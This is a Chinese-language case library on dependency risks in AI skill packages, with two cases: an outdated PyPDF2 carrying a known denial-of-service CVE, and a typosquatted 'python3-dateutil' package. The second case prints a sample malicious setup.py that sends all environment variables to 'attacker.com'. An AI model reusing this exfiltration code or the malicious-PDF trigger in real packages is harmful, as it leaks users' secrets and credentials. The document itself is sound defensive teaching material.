# 依赖风险 - 案例库

> 本文件记录依赖风险的典型案例
> 
> **参考**：CWE-1035、CWE-1104、PyUp Safety DB、Snyk、CVE

---

## 案例 1：使用含已知 CVE 的旧依赖

**来源**：CVE-2021-44228（类 Log4Shell 案例）、CWE-1035

### Skill 信息
- **Skill 名称**：pdf-processor-2.0.0
- **Skill 类别**：file-processing
- **测试场景**：PDF 文件解析

### 问题描述
Skill 依赖旧版本 `PyPDF2==1.26.0`，该版本存在已知的拒绝服务漏洞（CVE-2018-18082）。攻击者可构造恶意 PDF 导致无限循环或内存耗尽。

### 问题依赖
```txt
# requirements.txt
PyPDF2==1.26.0  # ⚠️ 存在 CVE-2018-18082
requests==2.19.0  # ⚠️ 存在多个 CVE，包括 SSRF
```

### 风险演示
```python
# 攻击者构造恶意 PDF
from PyPDF2 import PdfFileReader

malicious_pdf = open('attack.pdf', 'rb')
reader = PdfFileReader(malicious_pdf)
reader.getPage(0)  # 导致无限循环，100% CPU
```

### 修复方案
```txt
# requirements.txt
PyPDF2>=3.0.0  # 升级到安全版本
requests>=2.31.0  # 升级到安全版本
```

### 检测结果
- **严重程度**：🔴 致命（P0）
- **CVE 映射**：CVE-2018-18082
- **CWE 映射**：CWE-1035、CWE-1104
- **修复状态**：✅ 已修复

---

## 案例 2：依赖拼写仿冒攻击

**来源**：真实 PyPI 投毒事件（2022-2023）

### Skill 信息
- **Skill 名称**：data-analyzer-1.0.0
- **Skill 类别**：data-processing
- **测试场景**：数据可视化

### 问题描述
Skill 依赖 `python3-dateutil` 包（拼写错误），该包是恶意投毒包。真正的包名是 `python-dateutil`。安装时会执行恶意代码。

### 问题依赖
```txt
# requirements.txt
python3-dateutil==0.1  # ⚠️ 恶意投毒包！正确的是 python-dateutil
```

### 风险演示
```python
# 恶意包安装时执行的代码（setup.py）
import os, socket

def post_install():
    env_data = str(os.environ)
    s = socket.socket()
    s.connect(("attacker.com", 9999))
    s.send(env_data.encode())
    s.close()

post_install()
```

### 修复方案
```txt
# requirements.txt
python-dateutil>=2.8.2  # 正确的包名
```
